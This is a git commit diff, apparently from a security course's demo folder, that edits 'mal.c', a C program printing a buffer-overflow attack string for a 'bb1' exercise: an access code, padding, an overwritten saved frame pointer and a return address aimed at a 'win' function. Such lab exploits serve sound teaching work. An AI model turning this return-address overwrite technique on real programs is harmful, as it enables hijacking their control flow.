fa212de99a3f0a82db6d952f1cb6b2f5b4d5e6a2
Andrew Kritzler <10812727+peppermintpatty5@users.noreply.github.com>
2021-04-07 16:00:10 -0400

    Should have just used fwrite

--- educational-material/sem3/demo/sem3-10/bb1/mal.c
+++ educational-material/sem3/demo/sem3-10/bb1/mal.c
@@ -2,31 +2,19 @@
 #include <stdlib.h>
 
 /**
- * Print exactly n characters from s to stdout, regardless if they are
- * printable.
+ * Outputs attack string for bb1 problem. Assumes the host architecture is
+ * little endian.
  */
-void print_bytes(char const *s, size_t n);
-
 int main(void)
 {
-    char access_code[16] = "Sup3rs3cr3tC0de";
-    char padding[32];
-    char rbp[8] = "\x90\xde\xff\xff\xff\x7f\x00\x00";
-    char win[8] = "\x72\x11\x40\x00\x00\x00\x00\x00";
+    char access_code[48] = "Sup3rs3cr3tC0de";
+    void *rbp = (void *)0x7fffffffde90;
+    void *win = (void *)0x401172;
 
-    print_bytes(access_code, sizeof(access_code));
-    print_bytes(padding, sizeof(padding));
-    print_bytes(rbp, sizeof(rbp));
-    print_bytes(win, sizeof(win));
+    fwrite(access_code, 1, sizeof(access_code), stdout);
+    fwrite(&rbp, sizeof(rbp), 1, stdout);
+    fwrite(&win, sizeof(win), 1, stdout);
     fputc('\n', stdout);
 
     return EXIT_SUCCESS;
-}
-
-void print_bytes(char const *s, size_t n)
-{
-    size_t i;
-
-    for (i = 0; i < n; i++)
-        fputc(s[i], stdout);
 }
